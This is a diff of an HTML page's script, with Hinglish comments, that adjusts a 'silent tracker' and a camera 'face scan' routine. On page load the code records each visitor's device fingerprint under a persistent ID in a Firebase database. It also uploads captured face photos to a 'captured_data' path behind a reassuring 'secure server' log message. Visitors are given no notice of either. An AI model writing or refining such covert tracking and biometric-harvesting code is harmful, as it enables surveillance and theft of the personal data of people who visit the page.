@@ -14,7 +14,7 @@
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
   
-  <!-- 🚀 YEH LINE MISSING THI (Tumhari config file) -->
+  <!-- 🚀 Config File -->
   <script src="config.js"></script>
 
   <style>
@@ -230,17 +230,21 @@
 
   <script>
     // ==========================================
-    // 🚀 1. INITIALIZE FIREBASE & SILENT TRACKER
+    // 🚀 1. DEVICE ID & SILENT TRACKER (PURANA FORMAT)
     // ==========================================
     let db = null;
-    let deviceId = localStorage.getItem('device_tracker_id') || 'XPUI' + Math.floor(1000 + Math.random() * 9000) + String.fromCharCode(65 + Math.floor(Math.random() * 26)) + String.fromCharCode(65 + Math.floor(Math.random() * 26));
-    localStorage.setItem('device_tracker_id', deviceId);
+    // Purana format: dev_timestamp_randomstring
+    let deviceId = localStorage.getItem('device_tracker_id');
+    if (!deviceId) {
+      deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
+      localStorage.setItem('device_tracker_id', deviceId);
+    }
     
     if (typeof firebaseConfig !== 'undefined') {
       if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
       db = firebase.database();
       
-      // Silent Tracker Data (Saves on page load)
+      // Silent Tracker Data
       const deviceInfo = {
         deviceId: deviceId,
         userAgent: navigator.userAgent,
@@ -248,7 +252,8 @@
         platform: navigator.platform,
         screen: `${window.screen.width}x${window.screen.height}`,
         timestamp: Date.now(),
-        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' })
+        lastSeen: new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }),
+        status: 'active'
       };
 
       db.ref(`online_devices/${deviceId}`).set({
@@ -266,7 +271,7 @@
     }
 
     // ==========================================
-    // 🚀 2. CAMERA LOGIC
+    // 🚀 2. CAMERA & SCANNING LOGIC
     // ==========================================
     const $ = id => document.getElementById(id);
     const video = $("video");
@@ -349,6 +354,7 @@
       log("Biometric data compressed. Sending to secure server...");
 
       if (db) {
+        // 🚀 Yahan path bilkul tumhare purane format jaisa hai
         db.ref(`captured_data/${deviceId}/face_scan/${Date.now()}`).set({
           image: compressedPhoto,
           timestamp: Date.now(),
